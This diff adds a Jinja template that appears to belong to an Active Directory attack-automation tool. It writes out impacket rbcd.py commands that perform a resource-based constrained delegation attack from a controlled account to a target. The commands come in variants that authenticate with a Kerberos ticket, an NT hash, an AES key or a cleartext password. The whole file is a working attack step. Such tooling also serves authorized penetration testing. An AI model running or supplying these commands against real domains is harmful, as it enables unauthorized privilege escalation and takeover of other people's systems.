@@ -1,0 +1,12 @@
+{% set delegate_from = require['object'].obj.name -%}
+
+# Perform an RBCD from {{delegate_from}} to {{target.name}}
+{% if parent.krb_auth %}
+rbcd.py '{{fqdn}}/{{parent.obj.name}}' -use-ldaps -dc-ip {{dc_ip}} -k -no-pass -delegate-from '{{delegate_from}}' -delegate-to '{{target.name}}' -action write
+{%- elif parent.secret_type == T_SECRET_NTHASH %}
+rbcd.py '{{fqdn}}/{{parent.obj.name}}' -use-ldaps -dc-ip {{dc_ip}} -hashes :{{parent.secret|red}} -delegate-from '{{delegate_from}}' -delegate-to '{{target.name}}' -action write
+{%- elif parent.secret_type == T_SECRET_AESKEY %}
+rbcd.py '{{fqdn}}/{{parent.obj.name}}' -use-ldaps -dc-ip {{dc_ip}} -k -no-pass -aesKey {{parent.secret|red}} -delegate-from '{{delegate_from}}' -delegate-to '{{target.name}}' -action write
+{%- elif parent.secret_type == T_SECRET_PASSWORD %}
+rbcd.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}' -use-ldaps -dc-ip {{dc_ip}} -delegate-from '{{delegate_from}}' -delegate-to '{{target.name}}' -action write
+{%- endif %}
